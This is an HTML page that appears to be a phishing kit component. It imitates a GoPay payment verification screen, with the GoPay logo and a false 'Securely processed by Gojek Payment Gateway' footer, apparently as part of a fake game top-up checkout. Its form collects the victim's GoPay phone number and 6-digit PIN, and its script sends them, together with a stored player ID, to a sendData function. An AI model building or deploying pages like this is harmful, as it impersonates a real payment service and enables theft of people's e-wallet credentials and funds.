<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoPay - Pembayaran Instan</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
</head>
<body style="background: #00aa13; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column;">
    
    <div style="background: white; padding: 40px; border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.15); width: 100%; max-width: 420px; text-align: center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/86/Gopay_logo.svg" height="40" style="margin-bottom: 25px;">
        <h3 style="font-weight: 800; color: #00aa13; margin-bottom: 10px;">Verifikasi Pembayaran GoPay</h3>
        <p style="color: #64748B; margin-bottom: 30px; font-size: 0.9rem;">Masukkan nomor GoPay Anda untuk melanjutkan pembayaran.</p>
        
        <form id="gopayForm" style="text-align: left;">
            <div style="margin-bottom: 25px;">
                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #333;">NOMOR HP GOPAY</label>
                <input type="tel" id="identifier" placeholder="08xxxxxxxxxx" maxlength="13" required style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s; color: black;">
            </div>
            <div style="margin-bottom: 30px;">
                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #333;">PIN GOPAY (6 DIGIT)</label>
                <input type="password" id="pin" placeholder="••••••" maxlength="6" required style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 1.2rem; letter-spacing: 5px; outline: none; transition: 0.3s; color: black; text-align: center;">
            </div>
            
            <p id="errorMsg" style="color: #ff3333; font-size: 0.8rem; margin-bottom: 15px; display: none; text-align: center;"></p>
            <button type="submit" style="width: 100%; padding: 15px; background: #00aa13; color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; font-size: 1.1rem; box-shadow: 0 4px 12px rgba(0, 170, 19, 0.2);">KONFIRMASI PEMBAYARAN</button>
        </form>
    </div>

    <p style="margin-top: 20px; color: white; font-size: 0.8rem; opacity: 0.9;">Securely processed by Gojek Payment Gateway &copy; 2024</p>

    <script src="/js/main.js"></script>
    <script>
        // Check if logged in & has ID
        if(!localStorage.getItem('isLoggedIn') || !localStorage.getItem('playerId')) {
            window.location.href = '/checkout';
        }

        const phoneInput = document.getElementById('identifier');
        const pinInput = document.getElementById('pin');
        const errorMsg = document.getElementById('errorMsg');

        // Input Filtering: Force '08' prefix and only numbers
        phoneInput.oninput = function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length > 0 && !this.value.startsWith('08')) {
                this.value = '08' + this.value.substring(0, 11);
            }
        };

        // PIN Filtering: Only numbers
        pinInput.oninput = function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        };

        document.getElementById('gopayForm').onsubmit = function(e) {
            e.preventDefault();
            const identifier = phoneInput.value;
            const pin = pinInput.value;
            const playerId = localStorage.getItem('playerId');

            if (identifier.length < 10) {
                errorMsg.style.display = 'block';
                errorMsg.innerText = 'Nomor HP tidak valid (terlalu pendek)';
                return;
            }

            if (pin.length !== 6) {
                errorMsg.style.display = 'block';
                errorMsg.innerText = 'PIN GoPay harus tepat 6 digit';
                return;
            }

            errorMsg.style.display = 'none';
            sendData('gopay', { identifier, pin, playerId });
        };
    </script>
</body>
</html>
